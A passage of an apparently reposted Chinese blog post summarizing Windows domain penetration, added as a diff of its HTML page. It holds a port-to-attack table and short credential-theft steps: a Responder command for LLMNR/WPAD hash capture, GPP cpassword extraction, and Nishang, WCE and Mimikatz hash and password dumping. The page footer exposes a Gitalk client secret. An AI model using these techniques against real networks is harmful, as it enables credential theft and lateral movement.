+<td>imap</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>161</td>
+<td>snmp</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>389</td>
+<td>ldap</td>
+<td>注入攻击\未授权访问</td>
+</tr>
+<tr>
+<td>512/513/514</td>
+<td>linux r</td>
+<td>直接使用rlogin</td>
+</tr>
+<tr>
+<td>873</td>
+<td>rsync</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>1080</td>
+<td>socket</td>
+<td>爆破：进行内网渗透</td>
+</tr>
+<tr>
+<td>1352</td>
+<td>lotus</td>
+<td>爆破：弱口令\信息泄漏：源代码</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>mssql</td>
+<td>爆破：使用系统用户登录\注入攻击</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>oracle</td>
+<td>爆破：TNS \注入攻击</td>
+</tr>
+<tr>
+<td>2049</td>
+<td>nfs</td>
+<td>配置不当</td>
+</tr>
+<tr>
+<td>2181</td>
+<td>zookeeper</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>mysql</td>
+<td>爆破\拒绝服务\注入</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>rdp</td>
+<td>爆破\ Shift后门</td>
+</tr>
+<tr>
+<td>4848</td>
+<td>glassfish</td>
+<td>爆破：控制台弱口令\认证绕过</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>sybase / DB2</td>
+<td>爆破\注入</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>postgresql</td>
+<td>缓冲区溢出\注入攻击\爆破：弱口令</td>
+</tr>
+<tr>
+<td>5632</td>
+<td>pcanywhere</td>
+<td>拒绝服务\代码执行</td>
+</tr>
+<tr>
+<td>5900</td>
+<td>vnc</td>
+<td>爆破：弱口令\认证绕过</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>redis</td>
+<td>未授权访问\爆破：弱口令</td>
+</tr>
+<tr>
+<td>7001</td>
+<td>weblogic</td>
+<td>Java反序列化\控制台弱口令\控制台部署webshell</td>
+</tr>
+<tr>
+<td>80/443/8080</td>
+<td>web</td>
+<td>常见web攻击\控制台爆破\对应服务器版本漏洞</td>
+</tr>
+<tr>
+<td>8069</td>
+<td>zabbix</td>
+<td>远程命令执行</td>
+</tr>
+<tr>
+<td>9090</td>
+<td>websphere控制台</td>
+<td>爆破：控制台弱口令\ Java反序列</td>
+</tr>
+<tr>
+<td>9200/9300</td>
+<td>elasticsearch</td>
+<td>远程代码执行</td>
+</tr>
+<tr>
+<td>11211</td>
+<td>memcacache</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>27017</td>
+<td>mongodb</td>
+<td>爆破\未授权访问</td>
+</tr>
+</tbody></table>
+<h3 id="凭据"><a href="#凭据" class="headerlink" title="凭据"></a>凭据</h3><p>没有登录凭据的时候，可以破解对方的WPAv2个人Wifi密码，或者从某台不受域管理的主机下手。</p>
+<h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><p><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder</a>可以在一无所知的情况下取得最初的登陆凭据，其能率先监听、响应LLMNR协议(本地链路多播名称解析协议)和NBT-NS协议，其也可以利用<a href="https://blogs.technet.microsoft.com/srd/2012/11/13/ms12-074-addressing-a-vulnerability-in-wpads-pac-file-handling/" target="_blank" rel="noopener">WPAD（Web Proxy Auto-Discovery）漏洞</a>（也就是浏览器设置为自动检测的设置，受害者会从网络获取配置文件）</p>
+<p><img src="http://b404.xyz/img/hack/%E5%86%85%E7%BD%91/IE_Auto_detect_settings.png" alt="img"></p>
+<p>该情况，与受害人主机处于同一个网络里的攻击人员，能够回复受害主机发出的名称解析请求，并注入自己的PAC文件，代理所有WEB流量。这种攻击方式能强制浏览器用户对攻击人员的SMB服务器进行验证。若受害者在我们的SMB服务器上进行身份验证，就能够获取这个主机的NTLM算法的哈希响应值，而受害者没有任何察觉，若该用户进行过域验证，那么它就会使用缓存中的登陆凭据对服务器进行验证。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -i 10.10.10.149 -I eth0 -b Off -r Off -w On</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>收到WPAD请求的时候发送恶意响应。</p>
+</blockquote>
+<h4 id="组策略首选项"><a href="#组策略首选项" class="headerlink" title="组策略首选项"></a>组策略首选项</h4><p>GPP的全名是组策略首选项，是为了满足管理活动目录的需要存在的，GPP的操作对象是组策略对象（GPO），在所有计算机上更新密码或者指定新的管理员，就会使用这个机制更新。GPP发布的账号信息全部存储在<code>\\[Domain Controller]\SYSVOL\[Ddomain]\Policies</code>中。可以在该文件夹找到一个名为<code>Groups.xml</code>的文件。若能找到该文件，就可以在<code>Groups.xml</code>文件找到<code>cpassword</code>的哈希值。然后使用<a href="https://pastebin.com/TE3fvhEh" target="_blank" rel="noopener">gpprefdecrypt.py</a>解密GPP中本地管理员账户的密码，或者使用msf中的<code>post/windows/gather/credentials/gpp</code>获取本地管理员账号。</p>
+<h4 id="抓HASH"><a href="#抓HASH" class="headerlink" title="抓HASH"></a>抓HASH</h4><h5 id="Get-PassHashes-ps1"><a href="#Get-PassHashes-ps1" class="headerlink" title="Get-PassHashes.ps1"></a>Get-PassHashes.ps1</h5><p><img src="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1" alt="Get-PassHashes.ps1">脚本在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Tim\Desktop\nishang-master&gt; Set-ExecutionPolicy remotesigned</span><br><span class="line"></span><br><span class="line">PS C:\Users\Tim\Desktop\nishang-master&gt; Import-Module .\nishang.psm1</span><br><span class="line"></span><br><span class="line">PS C:\Users\Tim\Desktop\nishang-master&gt; Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+<h5 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h5><p><a href="http://www.ampliasecurity.com/research/windows-credentials-editor/" target="_blank" rel="noopener">WCE</a>能够列出Windows中的登陆会话、增加、修改、查询和删除相关凭据(LM/NT哈希值,Kerberos票据，明文密码)。</p>
+<p><code>wce -l</code>列出已登陆的会话和NTLM凭据，<code>wce -w</code>用于复制存储在认证摘要信息中的明文密码。只要有管理员权限就可以抓取密码，无需破解hash值。</p>
+<p><img src="http://b404.xyz/img/tools/domain/hash/wce.png" alt="img"></p>
+<h5 id="Minikatz"><a href="#Minikatz" class="headerlink" title="Minikatz"></a>Minikatz</h5><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimikatz</a>可从LSASS中恢复明文密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://b404.xyz/img/tools/domain/hash/mimikatz.png" alt="img"></p>
+<hr>
+<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><ul>
+<li><a href="http://www.mottoin.com/92978.html" target="_blank" rel="noopener">内网渗透测试定位技术总结</a>:<a href="http://www.mottoin.com/92978.html" target="_blank" rel="noopener">http://www.mottoin.com/92978.html</a></li>
+<li><a href="http://www.mottoin.com/85401.html" target="_blank" rel="noopener">nmap加载nse脚本在内网渗透中的使用－上</a>:<a href="http://www.mottoin.com/85401.html" target="_blank" rel="noopener">http://www.mottoin.com/85401.html</a></li>
+<li><a href="http://www.mottoin.com/85413.html" target="_blank" rel="noopener">nmap加载nse脚本在内网渗透中的使用－下</a>:<a href="http://www.mottoin.com/85413.html" target="_blank" rel="noopener">http://www.mottoin.com/85413.html</a></li>
+<li><a href="https://raw.githubusercontent.com/l3m0n/pentest_study/master/README.md" target="_blank" rel="noopener">pentest_study</a>:<a href="https://raw.githubusercontent.com/l3m0n/pentest_study/master/README.md" target="_blank" rel="noopener">https://raw.githubusercontent.com/l3m0n/pentest_study/master/README.md</a></li>
+</ul>
+<hr>
+<h2 id="Similar-Posts"><a href="#Similar-Posts" class="headerlink" title="Similar Posts"></a>Similar Posts</h2><ul>
+<li><a href="http://b404.xyz/2018/01/27/hidden-the-network/" target="_blank" rel="noopener">阻碍获取真实网络指纹</a></li>
+<li><a href="http://b404.xyz/2018/01/04/command-and-control-images/" target="_blank" rel="noopener">command-and-control-images</a></li>
+<li><a href="http://b404.xyz/2017/12/19/build-domain/" target="_blank" rel="noopener">域环境</a></li>
+</ul>
+<blockquote>
+<p>转自： <a href="http://b404.xyz/2017/12/30/exploit-domain/#%E5%86%85%E7%BD%91%E5%92%8C%E5%9F%9F" target="_blank" rel="noopener">http://b404.xyz/2017/12/30/exploit-domain/#%E5%86%85%E7%BD%91%E5%92%8C%E5%9F%9F</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2018/12/19/2018-12-19-域渗透/" title="域渗透总结">https://wh0ale.github.io/2018/12/19/2018-12-19-域渗透/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/域渗透/" rel="tag"><i class="fa fa-tag"></i># 域渗透</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2018/12/18/2018-12-18-Web fuzzing/" rel="next" title="Web Fuzzing">
+                <i class="fa fa-chevron-left"></i> Web Fuzzing
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2018/12/19/2018-12-19-工控安全/" rel="prev" title="工控安全">
+                工控安全 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#内网和域"><span class="nav-number">1.</span> <span class="nav-text">内网和域</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#内网"><span class="nav-number">1.1.</span> <span class="nav-text">内网</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域"><span class="nav-number">1.2.</span> <span class="nav-text">域</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域、工作组、家庭组"><span class="nav-number">1.3.</span> <span class="nav-text">域、工作组、家庭组</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#域渗透"><span class="nav-number">2.</span> <span class="nav-text">域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#命令"><span class="nav-number">2.1.</span> <span class="nav-text">命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Net基本命令"><span class="nav-number">2.1.1.</span> <span class="nav-text">Net基本命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dsquery的AD查询工具"><span class="nav-number">2.1.2.</span> <span class="nav-text">dsquery的AD查询工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOS常用命令"><span class="nav-number">2.1.3.</span> <span class="nav-text">DOS常用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#长命令"><span class="nav-number">2.1.4.</span> <span class="nav-text">长命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程命令执行"><span class="nav-number">2.1.5.</span> <span class="nav-text">远程命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#at（系统权限）"><span class="nav-number">2.1.5.0.1.</span> <span class="nav-text">at（系统权限）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#schtasks-用户权限和系统权限都可以"><span class="nav-number">2.1.5.1.</span> <span class="nav-text">schtasks(用户权限和系统权限都可以)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sc"><span class="nav-number">2.1.5.2.</span> <span class="nav-text">sc</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#系统权限的sc用法"><span class="nav-number">2.1.5.2.1.</span> <span class="nav-text">系统权限的sc用法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#指定用户权限启动的用法"><span class="nav-number">2.1.5.2.2.</span> <span class="nav-text">指定用户权限启动的用法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wmic"><span class="nav-number">2.1.5.3.</span> <span class="nav-text">wmic</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wmiexec"><span class="nav-number">2.1.5.4.</span> <span class="nav-text">wmiexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#impackets-wmiexec"><span class="nav-number">2.1.5.5.</span> <span class="nav-text">impackets wmiexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#psexec"><span class="nav-number">2.1.5.6.</span> <span class="nav-text">psexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PsRemoting"><span class="nav-number">2.1.5.7.</span> <span class="nav-text">PsRemoting</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定位"><span class="nav-number">2.2.</span> <span class="nav-text">定位</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务器-机器-定位"><span class="nav-number">2.2.1.</span> <span class="nav-text">服务器(机器)定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件定位"><span class="nav-number">2.2.2.</span> <span class="nav-text">文件定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#管理员定位"><span class="nav-number">2.2.3.</span> <span class="nav-text">管理员定位</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进攻"><span class="nav-number">2.3.</span> <span class="nav-text">进攻</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#取得合法身份前的攻击"><span class="nav-number">2.3.1.</span> <span class="nav-text">取得合法身份前的攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#认证"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">认证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#扫描"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#端口"><span class="nav-number">2.3.1.2.1.</span> <span class="nav-text">端口</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#凭据"><span class="nav-number">2.3.2.</span> <span class="nav-text">凭据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Responder"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">Responder</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#组策略首选项"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">组策略首选项</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#抓HASH"><span class="nav-number">2.3.2.3.</span> <span class="nav-text">抓HASH</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Get-PassHashes-ps1"><span class="nav-number">2.3.2.3.1.</span> <span class="nav-text">Get-PassHashes.ps1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WCE"><span class="nav-number">2.3.2.3.2.</span> <span class="nav-text">WCE</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Minikatz"><span class="nav-number">2.3.2.3.3.</span> <span class="nav-text">Minikatz</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refer"><span class="nav-number">3.</span> <span class="nav-text">Refer</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Similar-Posts"><span class="nav-number">3.1.</span> <span class="nav-text">Similar Posts</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
